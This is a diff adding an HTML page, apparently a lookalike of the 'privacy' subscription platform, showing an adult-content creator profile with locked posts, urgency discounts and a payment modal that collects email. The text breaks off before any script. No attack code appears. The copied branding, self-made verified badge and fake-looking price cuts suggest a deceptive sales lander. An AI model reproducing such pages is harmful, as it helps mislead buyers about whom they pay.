@@ -1,0 +1,684 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Privacy — Julia Guimarães</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#F4EFE7;
+  --card:#FFFFFF;
+  --ink:#232B36;
+  --muted:#8A94A3;
+  --orange:#E9682B;
+  --grad:linear-gradient(90deg,#F9A870 0%,#E87551 100%);
+  --blue:#3D9DF6;
+  --lock:#7C8DA8;
+  --line:#ECE5DA;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{
+  font-family:'Poppins',system-ui,sans-serif;
+  background:#26262A;
+  display:flex;justify-content:center;
+  color:var(--ink);
+}
+.phone{
+  width:100%;max-width:412px;min-height:100vh;
+  background:var(--bg);
+  position:relative;overflow-x:hidden;
+  box-shadow:0 0 60px rgba(0,0,0,.5);
+}
+
+/* ============ HEADER ============ */
+.pv-header{
+  position:sticky;top:0;z-index:50;
+  background:var(--bg);
+  height:54px;display:flex;align-items:center;justify-content:center;
+  padding:0 16px;
+}
+.pv-logo{font-weight:800;font-size:22px;letter-spacing:-.5px;display:flex;align-items:baseline;gap:2px}
+.pv-logo .dot{width:7px;height:7px;border-radius:2px;background:var(--orange);display:inline-block;transform:translateY(-1px)}
+.globe{position:absolute;right:16px;top:50%;transform:translateY(-50%);color:var(--ink);opacity:.9}
+.globe svg{display:block}
+
+/* ============ CARDS ============ */
+.wrap{padding:6px 12px 40px;display:flex;flex-direction:column;gap:12px}
+.card{background:var(--card);border-radius:18px;overflow:hidden;box-shadow:0 2px 10px rgba(60,40,20,.05)}
+
+/* ============ PERFIL ============ */
+.cover{height:168px;background:#E7DCCD;position:relative;overflow:hidden}
+.cover img{width:100%;height:100%;object-fit:cover;display:block}
+.p-info{padding:0 16px 16px;position:relative;display:flow-root}
+.avatar{
+  width:92px;height:92px;border-radius:50%;border:4px solid #fff;
+  background:#E7DCCD;overflow:hidden;
+  margin-top:-46px;position:relative;z-index:2;
+}
+.avatar img{width:100%;height:100%;object-fit:cover;display:block}
+.p-stats{
+  position:absolute;left:118px;right:14px;top:22px;
+  display:flex;justify-content:space-between;align-items:center;
+  color:var(--muted);font-size:13.5px;font-weight:500;
+}
+.p-stats span{display:flex;align-items:center;gap:5px}
+.p-stats svg{display:block}
+.p-name{
+  margin-top:10px;font-size:20px;font-weight:700;
+  display:flex;align-items:center;gap:6px;flex-wrap:wrap;
+}
+.p-name .gratis{font-weight:700}
+.p-name .verif{flex:none}
+.p-handle{color:var(--muted);font-size:14px;font-weight:400;margin-top:1px}
+.p-bio{font-size:14.5px;line-height:1.45;margin-top:10px;color:var(--ink)}
+.p-bio .more{color:var(--orange);font-weight:600;font-size:13.5px;cursor:pointer;display:inline-block;margin-top:4px}
+.p-bio .full{display:none}
+.p-bio.open .full{display:inline}
+.p-bio.open .part{display:none}
+.p-loc{display:flex;align-items:center;gap:7px;font-size:14.5px;font-weight:500;margin-top:16px;padding-top:16px;border-top:1px solid var(--line)}
+.p-loc svg{color:#5B6472;display:block;flex:none}
+.offer{background:#F6F1E8;border-radius:14px;padding:14px;margin-top:14px}
+.offer-h{display:flex;align-items:center;gap:8px;font-size:15px;font-weight:700}
+.offer-h svg{display:block;flex:none}
+.offer-row{display:flex;align-items:center;gap:9px;background:#fff;border-radius:10px;padding:8px 11px;margin-top:12px;color:#7C8DA8;font-size:13.5px;font-weight:500}
+.offer-av{width:24px;height:24px;border-radius:50%;overflow:hidden;background:#E7DCCD;flex:none}
+.offer-av img{width:100%;height:100%;object-fit:cover;display:block}
+.offer-save{display:inline-block;background:#E1F6E9;color:#23A065;font-size:12.5px;font-weight:700;padding:5px 13px;border-radius:14px;margin-top:15px}
+.offer .btn-grad{margin-top:11px}
+.offer-orig{text-align:right;color:#9AA3B1;font-size:13px;margin-top:9px}
+.offer-orig s{font-weight:600}
+.btn-grad{
+  width:100%;height:50px;border:none;border-radius:26px;
+  background:var(--grad);color:#3A2415;font-family:inherit;
+  font-size:16.5px;font-weight:700;cursor:pointer;
+  transition:transform .15s ease, filter .2s ease;
+}
+.btn-grad:active{transform:scale(.97)}
+.btn-grad.ok{filter:saturate(.6) brightness(1.05)}
+.p-sub{display:flex;align-items:center;justify-content:space-between;font-size:16px;font-weight:700;margin:22px 0 12px;cursor:pointer}
+.p-sub svg{transition:transform .2s;color:var(--ink);display:block}
+.p-sub.closed svg{transform:rotate(180deg)}
+.plan{display:flex;align-items:center;justify-content:space-between;font-size:15.5px;padding:0 24px;height:50px;margin-top:11px}
+
+/* ============ CONTADORES ============ */
+.counts{display:flex;align-items:center;padding:16px 8px}
+.counts .c{flex:1;display:flex;align-items:center;justify-content:center;gap:8px;font-size:15.5px;font-weight:700}
+.counts .c.posts{color:var(--orange)}
+.counts .c.media{color:var(--ink)}
+.counts .c svg{display:block}
+
+/* ============ POST ============ */
+.post-head{display:flex;align-items:center;gap:10px;padding:12px 14px}
+.post-head .pa{width:44px;height:44px;border-radius:50%;background:#E7DCCD;overflow:hidden;flex:none}
+.post-head .pa img{width:100%;height:100%;object-fit:cover;display:block}
+.post-head .pn{flex:1;min-width:0}
+.post-head .pn b{font-size:14.5px;font-weight:700;display:flex;align-items:center;gap:5px}
+.post-head .pn small{color:var(--muted);font-size:12.5px;font-weight:400}
+.dots{color:var(--ink);opacity:.75;cursor:pointer;padding:4px;flex:none}
+
+.locked{
+  position:relative;height:342px;background:var(--bg);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:16px;cursor:pointer;overflow:hidden;
+}
+.locked .wm{position:absolute;left:50%;top:52%;transform:translate(-46%,-50%);width:560px;pointer-events:none}
+.locked .pad{position:relative;z-index:2}
+.locked .lstats{
+  position:relative;z-index:2;display:flex;gap:16px;
+  color:var(--lock);font-size:15px;font-weight:600;align-items:center;
+}
+.locked .lstats span{display:flex;gap:6px;align-items:center}
+.media-box{display:none;height:342px;background:#111;position:relative}
+.media-box img,.media-box video{width:100%;height:100%;object-fit:cover;display:block}
+.post.unlocked .locked{display:none}
+.post.unlocked .media-box{display:block}
+
+.actions{display:flex;align-items:center;padding:12px 16px;gap:18px}
+.actions svg{display:block;cursor:pointer;color:var(--lock)}
+.actions .right{margin-left:auto}
+.heart.on{color:#F2545B}
+.heart.on svg{fill:#F2545B}
+.bm.on svg{fill:var(--ink);color:var(--ink)}
+
+/* ============ TOAST ============ */
+#toast{
+  position:fixed;left:50%;bottom:26px;transform:translateX(-50%) translateY(80px);
+  background:#232B36;color:#fff;font-size:13.5px;font-weight:500;
+  padding:11px 20px;border-radius:22px;opacity:0;transition:.3s;z-index:200;
+  white-space:nowrap;pointer-events:none;
+}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+/* ============ LIGHTBOX ============ */
+#lb{position:fixed;inset:0;background:rgba(0,0,0,.94);z-index:100;display:none;align-items:center;justify-content:center}
+#lb.open{display:flex}
+#lb img,#lb video{max-width:100%;max-height:100%;object-fit:contain}
+#lb .close{position:absolute;top:14px;right:16px;color:#fff;font-size:30px;cursor:pointer;z-index:2;line-height:1}
+#lb .nav{position:absolute;top:50%;transform:translateY(-50%);color:#fff;font-size:40px;cursor:pointer;user-select:none;padding:0 14px;z-index:2}
+#lb .prev{left:0}#lb .next{right:0}
+#lb .count{position:absolute;bottom:18px;left:50%;transform:translateX(-50%);color:#fff;font-size:14px;font-weight:600;background:rgba(0,0,0,.5);padding:5px 14px;border-radius:14px}
+
+.end-note{text-align:center;color:var(--muted);font-size:13px;padding:10px 0 2px}
+
+/* ============ PAGAMENTO ============ */
+#payModal{position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:150;display:none;align-items:flex-end;justify-content:center}
+#payModal.open{display:flex}
+.pay-card{width:100%;max-width:412px;background:#fff;border-radius:22px 22px 0 0;padding:26px 20px 30px;position:relative;animation:payUp .25s ease}
+@keyframes payUp{from{transform:translateY(60%);opacity:.4}to{transform:none;opacity:1}}
+.pay-x{position:absolute;top:14px;right:16px;font-size:28px;color:var(--muted);cursor:pointer;line-height:1}
+.pay-title{font-size:18px;font-weight:700}
+.pay-sub{font-size:14px;color:var(--muted);font-weight:500;margin:4px 0 16px}
+#payEmail{width:100%;height:50px;border:1.5px solid var(--line);border-radius:14px;padding:0 16px;font-family:inherit;font-size:15px;outline:none;background:#FAF7F2;color:var(--ink)}
+#payEmail:focus{border-color:var(--orange)}
+.pay-card .btn-grad{margin-top:14px}
+.pay-note{text-align:center;color:var(--muted);font-size:12.5px;margin-top:12px}
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- ============ HEADER ============ -->
+  <header class="pv-header">
+    <div class="pv-logo">privacy<span class="dot"></span></div>
+    <span class="globe" onclick="toast('Português (BR)')">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.5 2.6 3.8 5.7 3.8 9S14.5 18.4 12 21c-2.5-2.6-3.8-5.7-3.8-9S9.5 5.6 12 3z"></path>
+      </svg>
+    </span>
+  </header>
+
+  <div class="wrap">
+
+    <!-- ============ PERFIL ============ -->
+    <section class="card">
+      <div class="cover"><img id="imgBanner" alt="capa"></div>
+      <div class="p-info">
+        <div class="p-stats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path></svg>351</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+        <div class="avatar"><img id="imgAvatar" alt="avatar"></div>
+        <div class="p-name">
+          Julia Guimarães
+          <svg class="verif" width="17" height="17" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+        </div>
+        <div class="p-handle">@JuliaGuimaraes</div>
+        <div class="p-bio" id="bio">
+          <span class="part">Talvez você já me conheça de algum lugar… 25 anos, morena, japinha, e recém… </span><span class="full">Talvez você já me conheça de algum lugar… 25 anos, morena, japinha, e recém turbinada! +2 mil mídias por aqui… vem me conhecer melhor... 💋</span><span class="more" onclick="document.getElementById('bio').classList.toggle('open');this.textContent=document.getElementById('bio').classList.contains('open')?'Mostrar menos':'Ler mais'">Ler mais</span>
+        </div>
+        <div class="p-loc">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 21s-7-6.2-7-11a7 7 0 0 1 14 0c0 4.8-7 11-7 11z"></path><circle cx="12" cy="10" r="2.6"></circle></svg>
+          <span id="locCity">São Paulo</span> – BRA
+        </div>
+
+        <div class="offer">
+          <div class="offer-h">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="#E9682B"><path d="M12 2l2.2 7.8L22 12l-7.8 2.2L12 22l-2.2-7.8L2 12l7.8-2.2z"></path></svg>
+            Oferta de assinatura
+          </div>
+          <div class="offer-row">
+            <span class="offer-av"><img id="offerAv" alt=""></span>
+            Aproveite antes que acabe
+          </div>
+          <div class="offer-save">Economize 60%</div>
+          <button class="btn-grad" id="btnBig" onclick="openPay('big')">Assinar agora R$ 19,96</button>
+          <div class="offer-orig">Preço original <s>R$ 49,90</s></div>
+        </div>
+
+        <div class="p-sub" onclick="toggleSub()">
+          Assinaturas
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M6 15l6-6 6 6"></path></svg>
+        </div>
+        <div id="subList">
+          <button class="btn-grad plan" onclick="openPay('m3')"><span>3 meses (50% off )</span><span>R$ 74,85</span></button>
+          <button class="btn-grad plan" onclick="openPay('m6')"><span>6 meses (50% off )</span><span>R$ 149,70</span></button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ CONTADORES ============ -->
+    <section class="card">
+      <div class="counts">
+        <div class="c posts">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9"><rect x="6" y="2.5" width="12" height="19" rx="2.5"></rect><path d="M10.5 18.5h3"></path></svg>
+          422 Postagens
+        </div>
+        <div class="c media">
+          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="5" width="14" height="14" rx="2.5"></rect><path d="M18.5 8.5l3-1.8v10.6l-3-1.8"></path><circle cx="8" cy="10" r="1.4"></circle><path d="M16.5 16l-4-4-7 7"></path></svg>
+          627 Mídias
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ POSTS ============ -->
+    <section class="card post" id="post1">
+      <div class="post-head">
+        <div class="pa"><img class="pa-img" alt=""></div>
+        <div class="pn">
+          <b>Julia Guimarães
+            <svg width="15" height="15" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+          </b>
+          <small>@JuliaGuimaraes</small>
+        </div>
+        <span class="dots" onclick="toast('Opções do post')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"></circle><circle cx="12" cy="12" r="1.8"></circle><circle cx="12" cy="19" r="1.8"></circle></svg>
+        </span>
+      </div>
+      <div class="locked" onclick="lockedTap()">
+        <svg class="wm" viewBox="0 0 560 620" fill="none" stroke="#FBF7F1" stroke-width="15"><path d="M80 40h400a60 60 0 0 1 60 60v300a60 60 0 0 1-60 60H300L140 600l30-140H80a60 60 0 0 1-60-60V100a60 60 0 0 1 60-60z"></path></svg>
+        <svg class="pad" width="66" height="66" viewBox="0 0 24 24" fill="none" stroke="#7C8DA8" stroke-width="1.6"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path><circle cx="12" cy="15.5" r="1.3" fill="#7C8DA8" stroke="none"></circle></svg>
+        <div class="lstats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+      </div>
+      <div class="media-box" data-slot="foto1"></div>
+      <div class="actions">
+        <span class="heart" onclick="curtir(this)"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg></span>
+        <span onclick="toast('Comentários somente para assinantes')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 11.5c0 4.4-4 8-9 8-1.1 0-2.2-.2-3.1-.5L4 20.5l1.6-4C4.6 15.3 4 13.5 4 11.5c0-4.4 4-8 9-8s8 3.6 8 8z"></path></svg></span>
+        <span onclick="toast('Chama no direct 😉')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><path d="M14.5 9.2c-.5-.9-1.4-1.4-2.6-1.4-1.6 0-2.6.8-2.6 1.9 0 2.6 5.4 1.4 5.4 4.2 0 1.2-1.1 2-2.8 2-1.3 0-2.3-.5-2.8-1.5M12 6.2v11.6"></path></svg></span>
+        <span class="bm right" onclick="this.classList.toggle('on');toast(this.classList.contains('on')?'Salvo nos favoritos':'Removido dos favoritos')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3.5h12v17l-6-4.5-6 4.5v-17z"></path></svg></span>
+      </div>
+    </section>
+
+    <section class="card post" id="post2">
+      <div class="post-head">
+        <div class="pa"><img class="pa-img" alt=""></div>
+        <div class="pn">
+          <b>Julia Guimarães
+            <svg width="15" height="15" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+          </b>
+          <small>@JuliaGuimaraes</small>
+        </div>
+        <span class="dots" onclick="toast('Opções do post')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"></circle><circle cx="12" cy="12" r="1.8"></circle><circle cx="12" cy="19" r="1.8"></circle></svg>
+        </span>
+      </div>
+      <div class="locked" onclick="lockedTap()">
+        <svg class="wm" viewBox="0 0 560 620" fill="none" stroke="#FBF7F1" stroke-width="15"><path d="M80 40h400a60 60 0 0 1 60 60v300a60 60 0 0 1-60 60H300L140 600l30-140H80a60 60 0 0 1-60-60V100a60 60 0 0 1 60-60z"></path></svg>
+        <svg class="pad" width="66" height="66" viewBox="0 0 24 24" fill="none" stroke="#7C8DA8" stroke-width="1.6"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path><circle cx="12" cy="15.5" r="1.3" fill="#7C8DA8" stroke="none"></circle></svg>
+        <div class="lstats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+      </div>
+      <div class="media-box" data-slot="foto2"></div>
+      <div class="actions">
+        <span class="heart" onclick="curtir(this)"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg></span>
+        <span onclick="toast('Comentários somente para assinantes')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 11.5c0 4.4-4 8-9 8-1.1 0-2.2-.2-3.1-.5L4 20.5l1.6-4C4.6 15.3 4 13.5 4 11.5c0-4.4 4-8 9-8s8 3.6 8 8z"></path></svg></span>
+        <span onclick="toast('Chama no direct 😉')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><path d="M14.5 9.2c-.5-.9-1.4-1.4-2.6-1.4-1.6 0-2.6.8-2.6 1.9 0 2.6 5.4 1.4 5.4 4.2 0 1.2-1.1 2-2.8 2-1.3 0-2.3-.5-2.8-1.5M12 6.2v11.6"></path></svg></span>
+        <span class="bm right" onclick="this.classList.toggle('on');toast(this.classList.contains('on')?'Salvo nos favoritos':'Removido dos favoritos')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3.5h12v17l-6-4.5-6 4.5v-17z"></path></svg></span>
+      </div>
+    </section>
+
+    <section class="card post" id="post3">
+      <div class="post-head">
+        <div class="pa"><img class="pa-img" alt=""></div>
+        <div class="pn">
+          <b>Julia Guimarães
+            <svg width="15" height="15" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+          </b>
+          <small>@JuliaGuimaraes</small>
+        </div>
+        <span class="dots" onclick="toast('Opções do post')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"></circle><circle cx="12" cy="12" r="1.8"></circle><circle cx="12" cy="19" r="1.8"></circle></svg>
+        </span>
+      </div>
+      <div class="locked" onclick="lockedTap()">
+        <svg class="wm" viewBox="0 0 560 620" fill="none" stroke="#FBF7F1" stroke-width="15"><path d="M80 40h400a60 60 0 0 1 60 60v300a60 60 0 0 1-60 60H300L140 600l30-140H80a60 60 0 0 1-60-60V100a60 60 0 0 1 60-60z"></path></svg>
+        <svg class="pad" width="66" height="66" viewBox="0 0 24 24" fill="none" stroke="#7C8DA8" stroke-width="1.6"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path><circle cx="12" cy="15.5" r="1.3" fill="#7C8DA8" stroke="none"></circle></svg>
+        <div class="lstats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+      </div>
+      <div class="media-box" data-slot="foto3"></div>
+      <div class="actions">
+        <span class="heart" onclick="curtir(this)"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg></span>
+        <span onclick="toast('Comentários somente para assinantes')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 11.5c0 4.4-4 8-9 8-1.1 0-2.2-.2-3.1-.5L4 20.5l1.6-4C4.6 15.3 4 13.5 4 11.5c0-4.4 4-8 9-8s8 3.6 8 8z"></path></svg></span>
+        <span onclick="toast('Chama no direct 😉')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"></circle><path d="M14.5 9.2c-.5-.9-1.4-1.4-2.6-1.4-1.6 0-2.6.8-2.6 1.9 0 2.6 5.4 1.4 5.4 4.2 0 1.2-1.1 2-2.8 2-1.3 0-2.3-.5-2.8-1.5M12 6.2v11.6"></path></svg></span>
+        <span class="bm right" onclick="this.classList.toggle('on');toast(this.classList.contains('on')?'Salvo nos favoritos':'Removido dos favoritos')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3.5h12v17l-6-4.5-6 4.5v-17z"></path></svg></span>
+      </div>
+    </section>
+
+    <section class="card post" id="post4">
+      <div class="post-head">
+        <div class="pa"><img class="pa-img" alt=""></div>
+        <div class="pn">
+          <b>Julia Guimarães
+            <svg width="15" height="15" viewBox="0 0 24 24"><path fill="#3D9DF6" d="M12 1.8l2.5 2 3.2-.4 1 3 2.9 1.5-1 3 1 3-2.9 1.5-1 3-3.2-.4-2.5 2-2.5-2-3.2.4-1-3L2.4 15.4l1-3-1-3 2.9-1.5 1-3 3.2.4z"></path><path fill="#fff" d="M10.6 15.4l-2.9-2.9 1.3-1.3 1.6 1.6 4-4 1.3 1.3z"></path></svg>
+          </b>
+          <small>@JuliaGuimaraes</small>
+        </div>
+        <span class="dots" onclick="toast('Opções do post')">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="5" r="1.8"></circle><circle cx="12" cy="12" r="1.8"></circle><circle cx="12" cy="19" r="1.8"></circle></svg>
+        </span>
+      </div>
+      <div class="locked" onclick="lockedTap()">
+        <svg class="wm" viewBox="0 0 560 620" fill="none" stroke="#FBF7F1" stroke-width="15"><path d="M80 40h400a60 60 0 0 1 60 60v300a60 60 0 0 1-60 60H300L140 600l30-140H80a60 60 0 0 1-60-60V100a60 60 0 0 1 60-60z"></path></svg>
+        <svg class="pad" width="66" height="66" viewBox="0 0 24 24" fill="none" stroke="#7C8DA8" stroke-width="1.6"><rect x="5" y="10.5" width="14" height="10" rx="2.5"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path><circle cx="12" cy="15.5" r="1.3" fill="#7C8DA8" stroke="none"></circle></svg>
+        <div class="lstats">
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="18" height="18" rx="3"></rect><circle cx="8.5" cy="8.5" r="1.6"></circle><path d="M21 15l-5-5L5 21"></path></svg>299</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2.5" y="6" width="14" height="12" rx="2.5"></rect><path d="M16.5 10.5l5-3v9l-5-3"></path></svg>328</span>
+          <span><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg>52.2K</span>
+        </div>
+      </div>
+      <div class="media-box" data-slot="foto4"></div>
+      <div class="actions">
+        <span class="heart" onclick="curtir(this)"><svg width="23" height="23" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 20.5C7 16.5 3.5 13.3 3.5 9.6 3.5 7 5.5 5 8 5c1.6 0 3.1.8 4 2.1C12.9 5.8 14.4 5 16 5c2.5 0 4.5 2 4.5 4.6 0 3.7-3.5 6.9-8.5 10.9z"></path></svg></span>
+        <span onclick="toast('Comentários somente para assinantes')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 11.5c0 4.4-4 8-9 8-1.1 0-2.2-.2-3.1-.5L4 20.5l1.6-4C4.6 15.3 4 13.5 4 11.5c0-4.4 4-8 9-8s8 3.6 8 8z"></path></svg></span>
